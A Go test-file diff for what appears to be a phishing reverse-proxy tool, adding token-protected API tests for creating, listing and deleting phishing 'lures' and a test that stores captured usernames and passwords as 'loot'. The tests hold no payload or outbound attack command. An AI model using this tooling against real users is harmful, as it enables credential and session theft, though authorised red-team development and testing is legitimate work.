@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -17,6 +18,8 @@ import (
 	"github.com/stretchr/testify/require"
 	"github.com/valyala/fasthttp"
 )
+
+const APIToken = "abc"
 
 func nextHandler(c *fiber.Ctx) error {
 	return c.Next()
@@ -72,7 +75,7 @@ func TestAPIMiddlewareGetCookies(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 
 			cm := NewCookieManager()
-			app := createAPIApp(t, cm, nil)
+			app := createAPIApp(t, cm, nil, nil)
 
 			req := httptest.NewRequest("GET", "https://api.example.com/cookies", nil)
 			cookie := getValidCookie(t, app)
@@ -131,7 +134,7 @@ func TestAPIMiddlewareCreateCookies(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 
 			cm := NewCookieManager()
-			app := createAPIApp(t, cm, nil)
+			app := createAPIApp(t, cm, nil, nil)
 
 			body := strings.NewReader(tt.newCookie.String())
 			req := httptest.NewRequest("POST", "https://api.example.com/cookies", body)
@@ -180,11 +183,10 @@ func TestAPIMiddlewareGetOrigin(t *testing.T) {
 }
 
 func TestAPIMiddlewareSaveCreds(t *testing.T) {
-	cm := NewCookieManager()
 	var buff bytes.Buffer
 	lootRepo := NewFileLootRepository(&buff)
 	lootService := NewLootService(lootRepo)
-	app := createAPIApp(t, cm, lootService)
+	app := createAPIApp(t, NewCookieManager(), lootService, nil)
 	start := time.Now()
 
 	body := strings.NewReader(`{"username":"user","password":"pass"}`)
@@ -205,7 +207,154 @@ func TestAPIMiddlewareSaveCreds(t *testing.T) {
 	assert.Greater(t, info.Date.UnixNano(), start.UnixNano())
 }
 
-func createAPIApp(t *testing.T, cm CookieManager, lootService LootService) *fiber.App {
+func TestAPIMiddlewareGetLures(t *testing.T) {
+	byteSource := &byteSliceSource{[]byte(`
+    lures:
+    - name: lure2
+      lure_url: /he11o-lure2
+      target_url: https://www.example.com/some/url2
+    - name: lure1
+      lure_url: /he11o-lure1
+      target_url: https://www.example.com/some/url1`)}
+	lureService, err := NewLureService(byteSource)
+	require.NoError(t, err)
+	app := createAPIApp(t, NewCookieManager(), nil, lureService)
+
+	req := httptest.NewRequest("GET", "https://api.example.com/lures", nil)
+	req.Header["X-API-Token"] = []string{APIToken}
+	req.Header["Content-Type"] = []string{"application/json"}
+
+	resp, err := app.Test(req)
+	require.NoError(t, err)
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+	data, err := io.ReadAll(resp.Body)
+	require.NoError(t, err)
+
+	var lures []*APILure
+	err = json.Unmarshal(data, &lures)
+	require.NoError(t, err)
+
+	require.Equal(t, []*APILure{
+		{
+			LureURL:   "/he11o-lure1",
+			TargetURL: "https://www.example.com/some/url1",
+			Name:      "lure1",
+		},
+		{
+			LureURL:   "/he11o-lure2",
+			TargetURL: "https://www.example.com/some/url2",
+			Name:      "lure2",
+		},
+	}, lures)
+}
+
+func TestAPIMiddlewareAddLure(t *testing.T) {
+	byteSource := &byteSliceSource{}
+	lureService, err := NewLureService(byteSource)
+	require.NoError(t, err)
+	app := createAPIApp(t, NewCookieManager(), nil, lureService)
+
+	body := strings.NewReader(`{"lure_url":"/he11o-lure1","target_url":"https://www.example.com/some/url1","name":"lure1"}`)
+	req := httptest.NewRequest("POST", "https://api.example.com/lures", body)
+	req.Header["X-API-Token"] = []string{APIToken}
+	req.Header["Content-Type"] = []string{"application/json"}
+
+	resp, err := app.Test(req)
+	require.NoError(t, err)
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+
+	exists, err := lureService.ExistsByURL("/he11o-lure1")
+	require.NoError(t, err)
+	require.True(t, exists)
+
+	lures, err := lureService.GetAll()
+	require.NoError(t, err)
+	require.Equal(t, []*APILure{{
+		LureURL: "/he11o-lure1", TargetURL: "https://www.example.com/some/url1", Name: "lure1"}}, lures)
+}
+
+func TestAPIMiddlewareDeleteLure(t *testing.T) {
+	byteSource := &byteSliceSource{[]byte(`
+    lures:
+    - name: lure2
+      lure_url: /he11o-lure2
+      target_url: https://www.example.com/some/url2
+    - name: lure1
+      lure_url: /he11o-lure1
+      target_url: https://www.example.com/some/url1`)}
+	lureService, err := NewLureService(byteSource)
+	require.NoError(t, err)
+	app := createAPIApp(t, NewCookieManager(), nil, lureService)
+
+	req := httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil)
+	req.Header["X-API-Token"] = []string{APIToken}
+
+	resp, err := app.Test(req)
+	require.NoError(t, err)
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+
+	lures, err := lureService.GetAll()
+	require.NoError(t, err)
+
+	require.Equal(t, []*APILure{
+		{
+			LureURL:   "/he11o-lure1",
+			TargetURL: "https://www.example.com/some/url1",
+			Name:      "lure1",
+		},
+	}, lures)
+}
+
+func TestAPIMiddlewareInvalidAPIToken(t *testing.T) {
+	tests := []struct {
+		name    string
+		request *http.Request
+		token   string
+	}{
+		{
+			name:    "EmptyToken",
+			request: httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil),
+		},
+		{
+			name:    "InvalidToken",
+			request: httptest.NewRequest("DELETE", "https://api.example.com/lures/%2fhe11o-lure2", nil),
+			token:   "invalid_token",
+		},
+		{
+			name:    "GetLuresInvalidToken",
+			request: httptest.NewRequest("GET", "https://api.example.com/lures", nil),
+			token:   "invalid_token",
+		},
+		{
+			name: "CreateLureInvalidToken",
+			request: httptest.NewRequest("POST", "https://api.example.com/lures",
+				strings.NewReader(`{"lure_url":"/he11o-lure1","target_url":"https://www.example.com/some/url1","name":"lure1"}`)),
+			token: "invalid_token",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			lureService, err := NewLureService(&byteSliceSource{})
+			require.NoError(t, err)
+			app := createAPIApp(t, NewCookieManager(), nil, lureService)
+
+			if tt.token != "" {
+				tt.request.Header["X-API-Token"] = []string{tt.token}
+			}
+			if tt.request.Method == "POST" {
+				tt.request.Header["Content-Type"] = []string{"application/json"}
+			}
+
+			resp, err := app.Test(tt.request)
+			require.NoError(t, err)
+			require.Equal(t, http.StatusForbidden, resp.StatusCode)
+		})
+	}
+}
+
+func createAPIApp(t *testing.T, cm CookieManager, lootService LootService,
+	lureService LureService) *fiber.App {
 	t.Helper()
 	app := fiber.New()
 	auth := NewAuthMiddleware(AuthConfig{
@@ -223,11 +372,13 @@ func createAPIApp(t *testing.T, cm CookieManager, lootService LootService) *fibe
 	})
 	api := NewAPIMiddleware(APIConfig{
 		APIHostname:     "api.example.com",
+		APIToken:        APIToken,
 		DomainConverter: NewDomainConverter("example.com"),
 		AuthHandler:     auth,
 		LootService:     lootService,
+		LureService:     lureService,
 	})
-	app.Use(auth, api)
+	app.Use(api, auth)
 	app.All("/*", func(c *fiber.Ctx) error {
 		require.Fail(t, "should not be called")
 		return nil
